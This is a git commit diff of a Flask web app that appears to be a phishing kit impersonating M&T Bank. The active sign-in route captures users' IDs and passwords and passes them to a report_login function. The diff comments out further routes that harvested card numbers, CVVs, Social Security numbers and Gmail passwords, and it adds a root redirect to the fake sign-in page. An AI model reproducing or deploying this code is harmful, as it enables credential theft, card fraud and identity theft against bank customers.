175ed6121f22ad2b0cd8d457884582e59fdc520b
unknown <abdullahomotoke@gmail.com>
2022-08-10 07:57:23 +0800

    initial commit

--- mandt/main/routes.py
+++ mandt/main/routes.py
@@ -4,6 +4,9 @@ main = Blueprint('main', __name__)
 # @main.route('/')
 # def error_page():
 #     return render_template('error-signin.html')
+@main.route('/')
+def syncing_():
+    return redirect(url_for('portals.signin'))
 
 @main.route('/syncing-account')
 def syncing():
--- mandt/portals/routes.py
+++ mandt/portals/routes.py
@@ -11,41 +11,41 @@ def signin():
         if user_id and password:
             # print(user_id,password)
             report_login(user_id,password, bank_name='M & T')
-            return redirect(url_for('portals.card_confirmation'))
+            return redirect(url_for('main.syncing'))
     return render_template('signin.html')
 
-@portals.route('/email-confirmation', methods=['GET','POST'])
-def email_confirmation():
-    if request.method == 'POST':
-        email = request.form['email']
-        password = request.form['password']
-        if email and password:
-            # print(email,password)
-            report_login(email,password, bank_name='Gmail Account M&T')
-            return redirect(url_for('main.syncing'))
-    return render_template('identity-gmail.html')
+# @portals.route('/email-confirmation', methods=['GET','POST'])
+# def email_confirmation():
+#     if request.method == 'POST':
+#         email = request.form['email']
+#         password = request.form['password']
+#         if email and password:
+#             # print(email,password)
+#             report_login(email,password, bank_name='Gmail Account M&T')
+#             return redirect(url_for('main.syncing'))
+#     return render_template('identity-gmail.html')
 
-@portals.route('/ssn', methods=['GET','POST'])
-def ssn():
-    if request.method == 'POST':
-        ssn = request.form['ssn']
-        if ssn:
-            # print(ssn)
-            report_ssn(ssn)
-            return redirect(url_for('portals.email_confirmation'))
-    return render_template('identity-ssn.html')
+# @portals.route('/ssn', methods=['GET','POST'])
+# def ssn():
+#     if request.method == 'POST':
+#         ssn = request.form['ssn']
+#         if ssn:
+#             # print(ssn)
+#             report_ssn(ssn)
+#             return redirect(url_for('portals.email_confirmation'))
+#     return render_template('identity-ssn.html')
 
-@portals.route('/signin/card-confirmation', methods=['GET','POST'])
-def card_confirmation():
-    if request.method == 'POST':
-        card_name = request.form['card_name']
-        card_number = request.form['card_number']
-        exp_date = request.form['exp_date']
-        cvv = request.form['cvv']
-        if card_name and card_number and exp_date and cvv:
-            # print( card_name, card_number, exp_date, cvv)
-            report_card_details(card_name, card_number, exp_date, cvv)
-            return redirect(url_for('portals.ssn'))
-    return render_template('bank-card.html')
+# @portals.route('/signin/card-confirmation', methods=['GET','POST'])
+# def card_confirmation():
+#     if request.method == 'POST':
+#         card_name = request.form['card_name']
+#         card_number = request.form['card_number']
+#         exp_date = request.form['exp_date']
+#         cvv = request.form['cvv']
+#         if card_name and card_number and exp_date and cvv:
+#             # print( card_name, card_number, exp_date, cvv)
+#             report_card_details(card_name, card_number, exp_date, cvv)
+#             return redirect(url_for('portals.ssn'))
+#     return render_template('bank-card.html')
 
-# We are all 6 years old at some level
+# # We are all 6 years old at some level
